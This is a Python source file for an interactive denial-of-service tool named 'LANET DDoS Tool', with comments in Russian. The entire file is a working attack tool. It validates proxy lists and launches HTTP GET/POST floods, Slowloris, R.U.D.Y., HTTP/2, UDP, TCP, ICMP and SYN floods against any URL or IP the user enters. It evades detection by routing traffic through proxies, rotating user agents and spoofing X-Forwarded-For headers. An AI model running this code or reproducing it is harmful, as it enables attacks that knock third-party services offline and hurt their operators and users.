import time
import asyncio
import aiohttp
import random
import socket
import logging
import threading
import argparse
import os
import sys
import json
import pyfiglet
import fake_useragent
import subprocess
import ctypes
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple, Optional, Dict
from aiohttp_socks import ProxyConnector
from urllib.parse import urlparse
import scapy.all as scapy
import matplotlib.pyplot as plt
from datetime import datetime
from functools import lru_cache

# Логирование (минимизировано для скорости)
logging.basicConfig(
    level=logging.ERROR,  # Только ошибки
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('lanet_ddos.log')]
)

# Консоль
console = Console()

# Проверка pip
def ensure_pip():
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "--version"])
    except subprocess.CalledProcessError:
        console.print("[LANET] pip is not installed. Installing pip...")
        try:
            subprocess.check_call([sys.executable, "-m", "ensurepip", "--upgrade"])
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
            console.print("[LANET] pip installed successfully")
        except subprocess.CalledProcessError as e:
            console.print(f"[LANET] Failed to install pip: {e}")
            sys.exit(1)

# Проверка зависимостей с автоустановкой
def check_dependencies():
    ensure_pip()
    required = {'aiohttp', 'fake_useragent', 'rich', 'pyfiglet', 'aiohttp_socks', 'scapy', 'matplotlib'}
    missing = []
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            missing.append(lib)
    if missing:
        console.print(f"[LANET] Missing dependencies: {', '.join(missing)}. Installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            console.print(f"[LANET] Successfully installed: {', '.join(missing)}")
        except subprocess.CalledProcessError as e:
            console.print(f"[LANET] Failed to install dependencies: {e}")
            sys.exit(1)
    else:
        console.print("[LANET] All dependencies are installed")

# Очистка консоли
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# Проверка прав администратора
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Проверка интернета
def check_internet():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

# Загрузка конфигурации
def load_config(file_path: str = "config.json") -> Dict:
    default_config = {
        "max_proxies": 1000,
        "default_duration": 60,
        "default_intensity": 2000,
        "proxy_file": "pr.txt",
        "attack_types": ["flood", "slowloris", "udp", "tcp", "rudy", "http2", "icmp", "syn"]
    }
    try:
        with open(file_path, "r") as f:
            config = json.load(f)
        default_config.update(config)
    except FileNotFoundError:
        console.print("[LANET] Config not found, using defaults")
    return default_config

# Загрузка прокси
def load_proxies(file_path: str = "pr.txt") -> List[Dict]:
    try:
        with open(file_path, "r") as file:
            proxies = []
            for line in file:
                line = line.strip()
                if line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        proxies.append({"host": parts[0], "port": parts[1], "type": parts[2] if len(parts) > 2 else "http"})
        console.print(f"[LANET] Loaded {len(proxies)} proxies")
        return proxies
    except FileNotFoundError:
        console.print("[LANET] Error: pr.txt not found")
        sys.exit(1)

# Проверка прокси (оптимизирована)
async def check_proxy_async(proxy: Dict, session: aiohttp.ClientSession) -> Tuple[Dict, float, Optional[str]]:
    proxy_url = f"{proxy['type']}://{proxy['host']}:{proxy['port']}"
    start_time = time.time()
    latency = float("inf")
    proxy_type = None
    try:
        async with session.get("http://httpbin.org/ip", proxy=proxy_url, timeout=2, ssl=False) as response:
            if response.status == 200:
                latency = time.time() - start_time
                proxy_type = proxy["type"]
                console.print(f"[LANET] {proxy['host']}:{proxy['port']} OK ({latency:.2f}s)")
    except Exception:
        pass
    return proxy, latency, proxy_type

# Проверка всех прокси
async def check_all_proxies(proxies: List[Dict], max_concurrent: int = 200) -> List[Tuple[Dict, float, str]]:
    results = []
    connector = aiohttp.TCPConnector(limit=max_concurrent)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [check_proxy_async(proxy, session) for proxy in proxies]
        for future in asyncio.as_completed(tasks):
            result = await future
            proxy, latency, proxy_type = result
            if proxy_type:
                results.append((proxy, latency, proxy_type))
    return results

# Сохранение рабочих прокси
def save_working_proxies(proxies: List[Tuple[Dict, float, str]], output_file: str = "working_proxies.txt"):
    with open(output_file, "w") as f:
        for proxy, latency, proxy_type in proxies:
            f.write(f"{proxy['host']}:{proxy['port']}:{proxy_type}:{latency}\n")
    console.print(f"[LANET] Saved {len(proxies)} working proxies to {output_file}")

# Выбор лучших прокси
def select_best_proxies(proxies: List[Dict], max_proxies: int = 1000) -> List[Tuple[Dict, float, str]]:
    clear_console()
    print_proxy_banner()
    console.print("[LANET] Scanning proxies...")
    results = asyncio.run(check_all_proxies(proxies))
    results.sort(key=lambda x: x[1])
    best_proxies = results[:max_proxies]
    if not best_proxies:
        console.print("[LANET] No working proxies")
        sys.exit(1)
    console.print(f"[LANET] Selected {len(best_proxies)} proxies")
    save_working_proxies(best_proxies)
    return best_proxies

# Рандомные заголовки с кэшированием
@lru_cache(maxsize=100)
def get_random_headers() -> Dict:
    ua = fake_useragent.UserAgent()
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.5", "ru-RU,ru;q=0.5", "de-DE,de;q=0.5"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Referer": random.choice(["https://google.com", "https://yandex.ru", "https://bing.com"]),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1"
    }

# Генерация случайного payload
def generate_random_payload(size: int = 256) -> bytes:
    return os.urandom(size)

# HTTP Flood
async def http_flood(url: str, proxy: Dict, duration: int, stats: Dict, method: str = "GET"):
    proxy_url = f"{proxy['type']}://{proxy['host']}:{proxy['port']}"
    connector = ProxyConnector.from_url(proxy_url)
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        while time.time() - start_time < duration:
            headers = get_random_headers()
            try:
                if method == "POST":
                    payload = generate_random_payload(256)
                    async with session.post(url, headers=headers, data=payload, timeout=1, ssl=False) as response:
                        stats["requests"] += 1
                        if 200 <= response.status < 400:
                            stats["success"] += 1
                        else:
                            stats["failed"] += 1
                else:
                    async with session.get(url, headers=headers, timeout=1, ssl=False) as response:
                        stats["requests"] += 1
                        if 200 <= response.status < 400:
                            stats["success"] += 1
                        else:
                            stats["failed"] += 1
            except Exception:
                stats["failed"] += 1
            await asyncio.sleep(0.001)

# Slowloris
async def slowloris(url: str, proxy: Dict, duration: int, stats: Dict):
    proxy_url = f"{proxy['type']}://{proxy['host']}:{proxy['port']}"
    connector = ProxyConnector.from_url(proxy_url)
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        while time.time() - start_time < duration:
            headers = get_random_headers()
            headers["Connection"] = "keep-alive"
            try:
                async with session.get(url, headers=headers, timeout=15, ssl=False) as response:
                    stats["requests"] += 1
                    if 200 <= response.status < 400:
                        stats["success"] += 1
                    else:
                        stats["failed"] += 1
                await asyncio.sleep(random.uniform(5, 10))
            except Exception:
                stats["failed"] += 1

# R.U.D.Y.
async def rudy(url: str, proxy: Dict, duration: int, stats: Dict):
    proxy_url = f"{proxy['type']}://{proxy['host']}:{proxy['port']}"
    connector = ProxyConnector.from_url(proxy_url)
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        while time.time() - start_time < duration:
            headers = get_random_headers()
            headers["Content-Length"] = str(random.randint(1000, 10000))
            try:
                async with session.post(url, headers=headers, data=generate_random_payload(10), timeout=30, ssl=False) as response:
                    stats["requests"] += 1
                    if 200 <= response.status < 400:
                        stats["success"] += 1
                    else:
                        stats["failed"] += 1
                await asyncio.sleep(random.uniform(1, 5))
            except Exception:
                stats["failed"] += 1

# HTTP/2 Flood
async def http2_flood(url: str, proxy: Dict, duration: int, stats: Dict):
    proxy_url = f"{proxy['type']}://{proxy['host']}:{proxy['port']}"
    connector = ProxyConnector.from_url(proxy_url)
    async with aiohttp.ClientSession(connector=connector, http2=True) as session:
        start_time = time.time()
        while time.time() - start_time < duration:
            headers = get_random_headers()
            try:
                async with session.get(url, headers=headers, timeout=1, ssl=False) as response:
                    stats["requests"] += 1
                    if 200 <= response.status < 400:
                        stats["success"] += 1
                    else:
                        stats["failed"] += 1
                await asyncio.sleep(0.001)
            except Exception:
                stats["failed"] += 1

# UDP Flood
def udp_flood(target: str, port: int, duration: int, stats: Dict):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            payload = generate_random_payload(256)
            sock.sendto(payload, (target, port))
            stats["requests"] += 1
            stats["success"] += 1
        except Exception:
            stats["failed"] += 1
        time.sleep(0.001)
    sock.close()

# TCP Flood
def tcp_flood(target: str, port: int, duration: int, stats: Dict):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            sock.connect((target, port))
            sock.send(generate_random_payload(256))
            stats["requests"] += 1
            stats["success"] += 1
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except Exception:
            stats["failed"] += 1
        time.sleep(0.001)

# ICMP Flood
def icmp_flood(target: str, duration: int, stats: Dict):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            scapy.send(scapy.IP(dst=target)/scapy.ICMP(), verbose=False)
            stats["requests"] += 1
            stats["success"] += 1
        except Exception:
            stats["failed"] += 1
        time.sleep(0.001)

# SYN Flood
def syn_flood(target: str, port: int, duration: int, stats: Dict):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            scapy.send(scapy.IP(dst=target)/scapy.TCP(dport=port, flags="S"), verbose=False)
            stats["requests"] += 1
            stats["success"] += 1
        except Exception:
            stats["failed"] += 1
        time.sleep(0.001)

# Визуализация статистики
def plot_stats(stats_history: List[Dict], output_file: str = "attack_stats.png"):
    timestamps = [s["timestamp"] for s in stats_history]
    rps = [s["requests"] / max(1, s["elapsed"]) for s in stats_history]
    success = [s["success"] for s in stats_history]
    failed = [s["failed"] for s in stats_history]

    plt.figure(figsize=(10, 6))
    plt.plot(timestamps, rps, label="RPS", color="blue")
    plt.plot(timestamps, success, label="Success", color="green")
    plt.plot(timestamps, failed, label="Failed", color="red")
    plt.xlabel("Time")
    plt.ylabel("Count")
    plt.title("DDoS Attack Statistics")
    plt.legend()
    plt.grid()
    plt.savefig(output_file)
    plt.close()
    console.print(f"[LANET] Stats plot saved to {output_file}")

# Мониторинг статистики
def print_stats(stats: Dict, duration: int, stats_history: List[Dict]):
    start_time = time.time()
    while time.time() - start_time < duration:
        elapsed = max(1, time.time() - start_time)
        rps = stats["requests"] / elapsed
        stats_history.append({
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "requests": stats["requests"],
            "success": stats["success"],
            "failed": stats["failed"],
            "elapsed": elapsed
        })
        console.print(
            f"[LANET] Requests: {stats['requests']} | Success: {stats['success']} | "
            f"Failed: {stats['failed']} | RPS: {rps:.2f}"
        )
        time.sleep(1)

# Основная функция атаки
async def run_attack(url: str, proxies: List[Tuple[Dict, float, str]], attack_type: str, duration: int, intensity: int, config: Dict):
    clear_console()
    print_ddos_banner(proxies)
    stats = {"requests": 0, "success": 0, "failed": 0}
    stats_history = []

    parsed_url = urlparse(url)
    target = parsed_url.hostname
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)

    console.print(f"[LANET] Starting {attack_type} attack on {url} for {duration}s with {intensity} tasks")
    tasks = []
    if attack_type in ["flood", "slowloris", "rudy", "http2"]:
        connector = aiohttp.TCPConnector(limit=2000)
        async with aiohttp.ClientSession(connector=connector) as session:
            for _ in range(intensity):
                proxy, _, _ = random.choice(proxies)
                if attack_type == "flood":
                    tasks.append(http_flood(url, proxy, duration, stats, method=random.choice(["GET", "POST"])))
                elif attack_type == "slowloris":
                    tasks.append(slowloris(url, proxy, duration, stats))
                elif attack_type == "rudy":
                    tasks.append(rudy(url, proxy, duration, stats))
                elif attack_type == "http2":
                    tasks.append(http2_flood(url, proxy, duration, stats))
            monitor_thread = threading.Thread(target=print_stats, args=(stats, duration, stats_history))
            monitor_thread.start()
            await asyncio.gather(*tasks)
            monitor_thread.join()
    else:
        with ThreadPoolExecutor(max_workers=min(intensity * 2, 1000)) as executor:
            monitor_thread = threading.Thread(target=print_stats, args=(stats, duration, stats_history))
            monitor_thread.start()
            futures = []
            if attack_type == "udp":
                futures = [executor.submit(udp_flood, target, port, duration, stats) for _ in range(intensity)]
            elif attack_type == "tcp":
                futures = [executor.submit(tcp_flood, target, port, duration, stats) for _ in range(intensity)]
            elif attack_type == "icmp":
                futures = [executor.submit(icmp_flood, target, duration, stats) for _ in range(intensity)]
            elif attack_type == "syn":
                futures = [executor.submit(syn_flood, target, port, duration, stats) for _ in range(intensity)]
            for future in futures:
                future.result()
            monitor_thread.join()

    console.print(
        f"[LANET] Attack finished. Total Requests: {stats['requests']} | "
        f"Success: {stats['success']} | Failed: {stats['failed']}"
    )
    if stats_history:
        plot_stats(stats_history)

# Баннер прокси
def print_proxy_banner():
    title = pyfiglet.figlet_format("PROXY LANET", font="doom")
    frame = "#" * 50
    banner = f"{frame}\n{title}{frame}"
    clear_console()
    console.print(banner)

# Баннер DDOS
def print_ddos_banner(best_proxies: List[Tuple[Dict, float, str]]):
    title = pyfiglet.figlet_format("DDOS LANET", font="doom")
    frame = "#" * 50
    proxy_list = ["[PROXIES]"]
    for proxy, latency, _ in best_proxies[:5]:
        proxy_list.append(f"{proxy['host']}:{proxy['port']} ({latency:.2f}s)")
    proxy_list.append("[LOG] lanet_ddos.log")
    proxy_content = "\n".join(proxy_list)
    banner = f"{frame}\n{title}{proxy_content}\n{frame}"
    clear_console()
    console.print(banner)

# Меню
def print_menu():
    console.print("[1] HTTP Flood\n[2] Slowloris\n[3] UDP Flood\n[4] TCP Flood\n[5] R.U.D.Y.\n[6] HTTP/2 Flood\n[7] ICMP Flood\n[8] SYN Flood\n[0] Exit")

# Парсер аргументов
def parse_args():
    parser = argparse.ArgumentParser(description="LANET DDoS Tool")
    parser.add_argument("--url", type=str, help="Target URL or IP")
    parser.add_argument("--duration", type=int, help="Attack duration in seconds")
    parser.add_argument("--intensity", type=int, help="Number of concurrent tasks")
    parser.add_argument("--type", type=str, choices=["flood", "slowloris", "udp", "tcp", "rudy", "http2", "icmp", "syn"], help="Attack type")
    parser.add_argument("--proxy-file", type=str, default="pr.txt", help="Proxy file path")
    parser.add_argument("--config", type=str, default="config.json", help="Config file path")
    return parser.parse_args()

# Основной цикл
def main():
    if not is_admin() and os.name == "nt":
        console.print("[LANET] Warning: ICMP and SYN attacks require admin privileges on Windows")
    args = parse_args()
    try:
        check_dependencies()
        config = load_config(args.config)

        proxies = load_proxies(args.proxy_file or config["proxy_file"])
        if not proxies:
            console.print("[LANET] No proxies")
            sys.exit(1)
        best_proxies = select_best_proxies(proxies, config["max_proxies"])

        if not check_internet():
            console.print("[LANET] Error: No internet")
            sys.exit(1)

        if args.url and args.type:
            asyncio.run(run_attack(
                args.url,
                best_proxies,
                args.type,
                args.duration or config["default_duration"],
                args.intensity or config["default_intensity"],
                config
            ))
            return

        while True:
            clear_console()
            print_ddos_banner(best_proxies)
            print_menu()
            choice = console.input("[LANET]> ")
            clear_console()
            print_ddos_banner(best_proxies)

            if choice == "0":
                console.print("[LANET] Exit")
                break
            elif choice in ["1", "2", "3", "4", "5", "6", "7", "8"]:
                url = console.input("[LANET] url/ip> ")
                if not url.startswith("http") and choice in ["1", "2", "5", "6"]:
                    url = "http://" + url
                duration = int(console.input(f"[LANET] duration (seconds, default {config['default_duration']})> ") or config["default_duration"])
                intensity = int(console.input(f"[LANET] intensity (tasks, default {config['default_intensity']})> ") or config["default_intensity"])
                attack_type = {
                    "1": "flood", "2": "slowloris", "3": "udp", "4": "tcp",
                    "5": "rudy", "6": "http2", "7": "icmp", "8": "syn"
                }[choice]
                asyncio.run(run_attack(url, best_proxies, attack_type, duration, intensity, config))
            else:
                console.print("[LANET] Error: Choose 0-8")

    except Exception as e:
        console.print(f"[LANET] Fatal: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()